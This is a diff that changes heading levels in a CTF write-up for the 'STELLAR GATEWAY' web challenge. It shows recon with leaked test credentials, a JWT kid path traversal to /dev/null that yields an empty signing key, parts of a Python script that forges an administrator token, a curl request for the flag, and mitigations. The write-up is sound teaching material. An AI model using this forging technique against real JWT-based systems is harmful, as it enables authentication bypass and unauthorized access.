@@ -19,16 +19,16 @@ weight: 25
 
 ---
 
-## Challenge Description
+### Challenge Description
 
 Web app "STELLAR GATEWAY" - USS Threads Command Center.
 Objective: access `/flag` which requires **administrator** privileges.
 
 ---
 
-## Recon
+### Recon
 
-### Step 1 - Read HTML source of `/login`
+#### Step 1 - Read HTML source of `/login`
 
 ```html
 <!-- SGFoYWhhX25pY2VfdHJ5X2J1dF9JX2Rvbid0X2hpZGVfZmxhZ3NfaW5fc291cmNlX2NvZGU6KSkpKSkpKSkpKQ== -->
@@ -39,7 +39,7 @@ Decode the base64 comment: `Hahaha_nice_try_but_I_don't_hide_flags_in_source_cod
 
 Found **test credentials**: `pilot_001 / S3cret_P1lot_Ag3nt`.
 
-### Step 2 - Analyze JWT after login
+#### Step 2 - Analyze JWT after login
 
 ```
 POST /login  ->  Set-Cookie: session=<JWT>
@@ -55,7 +55,7 @@ Payload: {"sub":"pilot_001","role":"crew","iat":...}
 Key observation: the **`kid`** field in the header points to the file `galactic-key.key`.
 The server reads this file as the HMAC secret key to verify the JWT.
 
-### Step 3 - Test endpoints
+#### Step 3 - Test endpoints
 
 | Endpoint    | Crew JWT | No cookie     |
 |-------------|----------|---------------|
@@ -66,9 +66,9 @@ The server reads this file as the HMAC secret key to verify the JWT.
 
 ---
 
-## Vulnerability Analysis
+### Vulnerability Analysis
 
-### JWT kid Path Traversal (CWE-22)
+#### JWT kid Path Traversal (CWE-22)
 
 The server uses the `kid` field to locate the HMAC key file:
 
@@ -90,7 +90,7 @@ kid: "/dev/null"  ->  key = ""  ->  HMAC with empty string
 **Verification:** A JWT with `kid: /dev/null` signed with an empty key:
 - Server returns **403** (authenticated) instead of **302** (invalid JWT) -> JWT is valid!
 
-### Admin Authorization Mechanism
+#### Admin Authorization Mechanism
 
 The server does **not** use the `role` field in the JWT for admin checks.
 Instead, it looks up the user in the **database** based on `sub`:
@@ -110,9 +110,9 @@ discovered: **`administrator`** is the actual admin user in the DB!
 
 ---
 
-## Exploit
+### Exploit
 
-### Step 1 - Forge JWT
+#### Step 1 - Forge JWT
 
 ```python
 import hmac, hashlib, base64, json
@@ -138,7 +138,7 @@ forged_jwt = signing_input + "." + s
 print(forged_jwt)
 ```
 
-### Step 2 - Send request to get the flag
+#### Step 2 - Send request to get the flag
 
 ```bash
 curl -b "session=<forged_jwt>" http://<target>/flag
@@ -146,7 +146,7 @@ curl -b "session=<forged_jwt>" http://<target>/flag
 
 ---
 
-## Flag
+### Flag
 
 ```
 UVT{Y0u_F0Und_m3_I_w4s_l0s7_1n_th3_v01d_of_sp4c3_I_am_gr3tefull_and_1'll_w4tch_y0ur_m0v3s_f00000000000r3v3r}
@@ -154,7 +154,7 @@ UVT{Y0u_F0Und_m3_I_w4s_l0s7_1n_th3_v01d_of_sp4c3_I_am_gr3tefull_and_1'll_w4tch_y
 
 ---
 
-## Root Cause & Mitigation
+### Root Cause & Mitigation
 
 **Root cause:**
 1. No `kid` field validation -> path traversal to `/dev/null`
@@ -177,7 +177,7 @@ if (!user) return res.redirect('/login');
 
 ---
 
-## Attack Chain
+### Attack Chain
 
 ```
 Recon /login page
